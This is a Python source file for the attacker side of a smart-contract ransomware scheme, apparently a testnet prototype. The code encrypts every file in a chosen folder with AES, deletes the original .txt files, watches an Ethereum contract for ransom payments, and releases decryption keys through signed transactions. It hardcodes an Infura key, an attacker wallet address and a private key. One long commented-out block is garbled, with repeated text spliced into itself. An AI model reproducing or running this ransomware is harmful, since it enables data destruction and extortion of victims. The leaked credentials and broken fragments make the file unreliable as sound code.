import os
import hashlib
import asyncio
import csv
from Crypto.Cipher import AES
from web3 import Web3

# Connect to the Ethereum network
w3 = Web3(Web3.HTTPProvider('https://sepolia.infura.io/v3/00e3e1fc31e54128b0b61f649de128aa'))

# Load the ransomware smart contract
contract_address = '0xD5Cc1B74b9393c049482Eed9409e5935EA6d91a3'
contract_abi = [{
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": False,
      "inputs": [
        {
          "indexed": False,
          "internalType": "string",
          "name": "victimID",
          "type": "string"
        },
        {
          "indexed": False,
          "internalType": "bytes32",
          "name": "masterKey",
          "type": "bytes32"
        }
      ],
      "name": "MasterKeyRevealed",
      "type": "event"
    },
    {
      "anonymous": False,
      "inputs": [
        {
          "indexed": False,
          "internalType": "string",
          "name": "victimID",
          "type": "string"
        },
        {
          "indexed": False,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "RansomPaid",
      "type": "event"
    },
    {
      "anonymous": False,
      "inputs": [
        {
          "indexed": False,
          "internalType": "string",
          "name": "victimID",
          "type": "string"
        },
        {
          "indexed": False,
          "internalType": "string",
          "name": "sampleID",
          "type": "string"
        },
        {
          "indexed": False,
          "internalType": "bytes32",
          "name": "decryptionKey",
          "type": "bytes32"
        }
      ],
      "name": "SampleDecryptionKeyRevealed",
      "type": "event"
    },
    {
      "anonymous": False,
      "inputs": [
        {
          "indexed": False,
          "internalType": "string",
          "name": "victimID",
          "type": "string"
        },
        {
          "indexed": False,
          "internalType": "string[]",
          "name": "sampleIDs",
          "type": "string[]"
        }
      ],
      "name": "SampleDecryptionRequested",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "DEADLINE_DURATION",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "SAMPLE_PERCENTAGE",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attacker",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        },
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "fileSampleRequests",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "victimID",
          "type": "string"
        }
      ],
      "name": "getFileIDs",
      "outputs": [
        {
          "internalType": "string[]",
          "name": "",
          "type": "string[]"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "victimID",
          "type": "string"
        },
        {
          "internalType": "bytes32",
          "name": "commitment",
          "type": "bytes32"
        }
      ],
      "name": "payRansom",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "ransomAmount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "victimID",
          "type": "string"
        }
      ],
      "name": "refundRansom",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "victimID",
          "type": "string"
        }
      ],
      "name": "registerVictim",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "victimID",
          "type": "string"
        },
        {
          "internalType": "string[]",
          "name": "sampleIDs",
          "type": "string[]"
        }
      ],
      "name": "requestSamplesDecryption",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "victimID",
          "type": "string"
        },
        {
          "internalType": "bytes32",
          "name": "masterKey",
          "type": "bytes32"
        }
      ],
      "name": "revealMasterKey",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "victimID",
          "type": "string"
        },
        {
          "internalType": "string[]",
          "name": "sampleIDs",
          "type": "string[]"
        },
        {
          "internalType": "bytes32[]",
          "name": "decryptionKeys",
          "type": "bytes32[]"
        }
      ],
      "name": "revealSamplesDecryptionKeys",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        },
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "name": "sampleDecrypted",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "totalFiles",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "name": "victimAddresses",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "name": "victims",
      "outputs": [
        {
          "internalType": "bytes32",
          "name": "commitment",
          "type": "bytes32"
        },
        {
          "internalType": "uint256",
          "name": "paymentTimestamp",
          "type": "uint256"
        },
        {
          "internalType": "bool",
          "name": "paid",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }]

contract = w3.eth.contract(address=contract_address, abi=contract_abi)

def encrypt_files_in_folder(folder_path, victim_id, master_key):
    # Iterate over all files in the specified folder
    file_data = []
    for root, dirs, files in os.walk(folder_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            file_id, encrypted_file_path = encrypt_file(file_path, victim_id, master_key)

            file_data.append((file_id, encrypted_file_path))
    commitment = hashlib.sha256(master_key).digest()
    for filename in os.listdir(folder_path):
    # Check if the file ends with ".txt"
      if filename.endswith(".txt"):
          # Construct the file path
          file_path = os.path.join(folder_path, filename)
          
          # Delete the file
          os.remove(file_path)
          print(f"Deleted file: {filename}")
    return file_data,commitment

def encrypt_file(file_path, victim_id, master_key):
    # Generate a unique file ID
    file_id = hashlib.sha256(file_path.encode()).hexdigest()
    
    # Generate the decryption key for the file
    decryption_key = hashlib.sha256(master_key + victim_id.encode() + file_id.encode()).digest()
    # Encrypt the file using AES
    with open(file_path, 'rb') as file:
        plaintext = file.read()
    cipher = AES.new(decryption_key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)

    # Save the encrypted file with the required parameters
    encrypted_file_path = file_path + '.encrypted'
    with open(encrypted_file_path, 'wb') as encrypted_file:
        encrypted_file.write(cipher.nonce)
        encrypted_file.write(tag)
        encrypted_file.write(ciphertext)

    # Return the file ID and encrypted file path
    return file_id, encrypted_file_path

def get_sample_decryption_requests(victim_id):
  # Create a filter for the SampleDecryptionRequested event
    event_filter = contract.events.SampleDecryptionRequested.create_filter( fromBlock=0, toBlock='latest')
    
    # Check for new events
    for event in event_filter.get_all_entries():
        print(event)
        if event['args']['victimID'] == victim_id:
            sample_ids = event['args']['sampleIDs']
            print(f"Sample decryption requested for Victim ID: {victim_id}, Sample IDs: {sample_ids}")
            return sample_ids
    
    # Create a filter for the SampleDecryptionRequested event
    # Create an event filter
   # event_filter = contract.events.SampleDecryptionRequested.create_filter(fromBlock='latest')

# Retrieve the event logs
   # event_logs = event_filter.get_all_entries()

   # for log in event_logs:
   #   print(log)
   # print("MC")
    # for log in event_logsevent_logs = event_filter.get_all_entries()

    
    # for log in event_logs:
    #   print("Event:", log['event'])
    #   print("Transaction Hash:", log['transactionHash'].hex())
    #   print("Block Number:", log['blockNumber'])
    #   print("Arguments:")
    #   for arg_name, arg_value in log['args'].items():
    #       print(f"  {arg_name}: {arg_value}")
    #   print("---")
    # # Check for new events
    # #for event in event_filter.get_new_entries():
    #  #   print(event)
    #   #  if event['args']['victimID'] == victim_id:
    #    #     sample_ids = event['args']['sampleIDs']
    #     #    print(f"Sample decryption requested for Victim ID: {victim_id}, Sample IDs: {sample_ids}")
    #      #   return sample_ids
    
    # return None:
    #   print("Event:", log['event']event_logs = event_filter.get_all_entries()

    
    # for log in event_logs:
    #   print("Event:", log['event'])
    #   print("Transaction Hash:", log['transactionHash'].hex())
    #   print("Block Number:", log['blockNumber'])
    #   print("Arguments:")
    #   for arg_name, arg_value in log['args'].items():
    #       print(f"  {arg_name}: {arg_value}")
    #   print("---")
    # # Check for new events
    # #for event in event_filter.get_new_entries():
    #  #   print(event)
    #   #  if event['args']['victimID'] == victim_id:
    #    #     sample_ids = event['args']['sampleIDs']
    #     #    print(f"Sample decryption requested for Victim ID: {victim_id}, Sample IDs: {sample_ids}")
    #      #   return sample_ids
    
    # return None)
    #   print("Transaction Hash:", log['transactionHash'].hex())
    #   print for log in event_logsevent_logs = event_filter.get_all_entries()

    
    # for log in event_logs:
    #   print("Event:", log['event'])
    #   print("Transaction Hash:", log['transactionHash'].hex())
    #   print("Block Number:", log['blockNumber'])
    #   print("Arguments:")
    #   for arg_name, arg_value in log['args'].items():
    #       print(f"  {arg_name}: {arg_value}")
    #   print("---")
    # # Check for new events
    # #for event in event_filter.get_new_entries():
    #  #   print(event)
    #   #  if event['args']['victimID'] == victim_id:
    #    #     sample_ids = event['args']['sampleIDs']
    #     #    print(f"Sample decryption requested for Victim ID: {victim_id}, Sample IDs: {sample_ids}")
    #      #   return sample_ids
    
    # return None:
    #   print("Event:", log['event']event_logs = event_filter.get_all_entries()

    
    # for log in event_logs:
    #   print("Event:", log['event'])
    #   print("Transaction Hash:", log['transactionHash'].hex())
    #   print("Block Number:", log['blockNumber'])
    #   print("Arguments:")
    #   for arg_name, arg_value in log['args'].items():
    #       print(f"  {arg_name}: {arg_value}")commitment
    #   print("---")
    # # Check for new events
    # #for event in event_filter.get_new_entries():
    #  #   print(event)
    #   #  if event['args']['victimID'] == victim_id:
    #    #     sample_ids = event['args']['sampleIDs']
    #     #    print(f"Sample decryption requested for Victim ID: {victim_id}, Sample IDs: {sample_ids}")
    #      #   return sample_ids
    
    # return None)
    #   print("Transaction Hash:", log['transactionHash'].hex())
    #   print("Block Number:", log['blockNumber'])
    #   print("Arguments:")
    #   for arg_name, arg_value in log['args'].items():
    #       print(f"  {arg_name}: {arg_value}")
    #   print("---")
    # # Check for new events
    # #for event in event_filter.get_new_entries():
    #  #   print(event)
    #   #  if event['args']['victimID'] == victim_id:
    #    #     sample_ids = event['args']['sampleIDs']
    #     #    print(f"Sample decryption requested for Victim ID: {victim_id}, Sample IDs: {sample_ids}")
    #      #   return sample_ids
    
    return None

def reveal_sample_decryption_keys(victim_id, sample_ids,master_key):
    # Generate the sample decryption keys
    sample_decryption_keys = []
    for sample_id in sample_ids:
        decryption_key = hashlib.sha256(master_key + victim_id.encode() + str(sample_id).encode()).digest()
        sample_decryption_keys.append(decryption_key)

    
    # Call the smart contract function to reveal the sample decryption keys
    nonce = w3.eth.get_transaction_count(attacker_address)
    transaction = contract.functions.revealSamplesDecryptionKeys(victim_id, sample_ids, sample_decryption_keys).build_transaction({
        'from': attacker_address,
        'nonce': nonce,
        'gas': 500000,
        'gasPrice': w3.to_wei('20', 'gwei')
    })
    signed_transaction = w3.eth.account.sign_transaction(transaction, attacker_private_key)
    transaction_hash = w3.eth.send_raw_transaction(signed_transaction.rawTransaction)
    transaction_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)
    print(f"Sample decryption keys revealed for Victim ID: {victim_id}")
def decrypt_file(file_path, decryption_key):
    with open(file_path, 'rb') as file:
        nonce = file.read(16)
        tag = file.read(16)
        ciphertext = file.read()

    cipher = AES.new(decryption_key, AES.MODE_EAX, nonce)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)

    # Get the directory of the encrypted file
    encrypted_file_dir = os.path.dirname(file_path)

    # Create the 'decrypted_files' folder if it doesn't exist
    decrypted_folder = os.path.join(encrypted_file_dir, 'decrypted_files')
    os.makedirs(decrypted_folder, exist_ok=True)

    # Get the original file name without the '.encrypted' extension
    original_file_name = os.path.basename(file_path)[:-10]

    # Create the path for the decrypted file in the 'decrypted_files' folder
    decrypted_file_path = os.path.join(decrypted_folder, original_file_name)
    with open(decrypted_file_path, 'wb') as file:
        file.write(plaintext)
def check_ransom_paid(victim_id):
    # Create a filter for the RansomPaid event
    event_filter = contract.events.RansomPaid.create_filter(fromBlock=0, toBlock='latest')
    event_logs= event_filter.get_all_entries()
    # Check for new events
    for event in event_logs:
        print(event)
        if event['args']['victimID'] == victim_id:
            print(f"Ransom paid for Victim ID: {victim_id}")
            return True
    
    return False

def reveal_master_key(victim_id,master_key):
    # Call the smart contract function to reveal the master key
    nonce = w3.eth.get_transaction_count(attacker_address)
    transaction = contract.functions.revealMasterKey(victim_id, master_key).build_transaction({
        'from': attacker_address,
        'nonce': nonce,
        'gas': 500000,
        'gasPrice': w3.to_wei('20', 'gwei')
    })
    signed_transaction = w3.eth.account.sign_transaction(transaction, attacker_private_key)
    transaction_hash = w3.eth.send_raw_transaction(signed_transaction.rawTransaction)
    transaction_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)
    print(f"Master key revealed for Victim ID: {victim_id}")

def main():
    victim_id = '1234567891'
    database_file = 'database.txt'
    if os.path.exists(database_file):
        # Read the master key from the database file
        with open(database_file, 'r') as file:
            for line in file:
                data = line.strip().split(',')
                if data[0] == victim_id:
                    master_key = bytes.fromhex(data[1])
                    break
            else:
                # If the victim_id is not found, generate a new master key and add a record
                master_key = os.urandom(32)
                with open(database_file, 'a') as file:
                    file.write(f"{victim_id},{master_key.hex()}\n")
    else:
        # If the database file doesn't exist, create it and add a new record
        master_key = os.urandom(32)
        with open(database_file, 'w') as file:
            file.write(f"{victim_id},{master_key.hex()}\n")

    while True:
        print("\nAttacker Menu:")
        print("1. Check for Sample Decryption Requests")
        print("2. Check for Ransom Payment")
        print("3. Encrypt Files in Folder")
        print("4. Exit")
        
        choice = int(input("Enter your choice (1-4): "))
        
        if choice == 1:
            sample_ids =  get_sample_decryption_requests(victim_id)
            if sample_ids:
                 reveal_sample_decryption_keys(victim_id, sample_ids,master_key)
            else:
                print("No sample decryption requests found.")
        elif choice == 2:
            ransom_paid =  check_ransom_paid(victim_id)
            if ransom_paid:
                 reveal_master_key(victim_id,master_key)
            else:
                print("Ransom not paid yet.")
        elif choice == 3:
            folder_path = input("Enter the folder path to encrypt files: ")
            file_data, commitment = encrypt_files_in_folder(folder_path, victim_id, master_key)
            print(f"Files encrypted:")
            for file_id, encrypted_file_path in file_data:
                print(f"File ID: {file_id}, Encrypted file path: {encrypted_file_path}")
            encryption_data_file = f"encryption_data_{victim_id}.txt"
            with open(encryption_data_file, 'w') as file:
                file.write(f"Commitment: {commitment}\n\n")
                file.write("Encrypted Files:\n")
                for file_id, encrypted_file_path in file_data:
                    file.write(f"File ID: {file_id}, Encrypted File Path: {encrypted_file_path}\n")

        elif choice == 4:
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

# Attacker's Ethereum address and private key
attacker_address = '0xCcD5681592c7F697B0Adfd5eA07c0d82EB5BaF84'
attacker_private_key = '8e3c041801ee0e3ef3fea667eebbc376de4f5d866d0fe5d5509acb039b252acc'

# Run the main function
if __name__ == '__main__':
    main()
